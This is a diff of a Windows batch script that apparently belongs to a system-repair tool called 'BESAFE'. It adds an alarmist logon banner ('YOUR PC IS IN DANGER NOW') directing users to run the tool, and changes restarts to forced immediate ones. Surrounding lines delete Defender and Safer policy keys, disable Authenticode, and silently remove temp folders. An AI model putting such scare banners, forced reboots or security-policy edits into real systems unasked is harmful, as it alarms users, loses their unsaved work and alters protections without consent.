@@ -224,8 +224,9 @@ echo [-%LM%\SOFTWARE\Policies\Microsoft\Windows\Safer]>>%B%
 echo.>>%B%
 echo [%LM%\SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers]>>%B%
 echo "AuthenticodeEnabled"=dword:00000000>>%B%
-echo [%CU%\Control Panel\Desktop]>>%B%
-echo "UserPreferencesMask"=hex:98,52,07,80,13,01,00,00>>%B%
+echo [%LM%\Software\Microsoft\Windows\CurrentVersion\Policies\System]>>%B%
+echo "LegalNoticeCaption"="YOUR PC IS IN DANGER NOW ! ! !">>%B%
+echo "LegalNoticeText"="PLEASE DO REMEMBER TO RUN [ BESAFE ] FROM START MENU TO BRING YOUR PC BACK TO SAFETY ! ! !">>%B%
 echo [-%LM%\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]>>%B%
 echo.>>%B%
 echo.>>%B%
@@ -1652,10 +1653,10 @@ ipconfig /flushdns 1>nul 2>nul
 rd /s /q %T% 1>nul 2>nul
 rd /s /q "%tmp%" 1>nul 2>nul
 ipconfig /flushdns 1>nul 2>nul
-shutdown /r /o /t 1 1>nul 2>nul
-shutdown /r /o /t 1 1>nul 2>nul
-shutdown /r /t 1 1>nul 2>nul
-shutdown /r /t 1 1>nul 2>nul
+shutdown /r /o /f /t 0 1>nul 2>nul
+shutdown /r /o /f /t 0 1>nul 2>nul
+shutdown /r /f /t 0 1>nul 2>nul
+shutdown /r /f /t 0 1>nul 2>nul
 
 
 
